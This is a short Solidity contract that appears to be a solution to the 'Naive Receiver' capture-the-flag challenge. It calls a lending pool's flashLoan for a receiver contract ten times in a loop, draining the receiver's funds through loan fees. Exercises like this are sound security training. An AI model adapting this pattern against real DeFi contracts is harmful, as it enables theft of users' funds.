// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

contract NavieAttack {
    address payable private pool;
    address private receiver;

    constructor(address poolAddress, address receiverAddress) {
        pool = payable(poolAddress);
        receiver = receiverAddress;
    }

    function attack() public {
        for (uint8 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(receiver, 1);
        }
    }
}
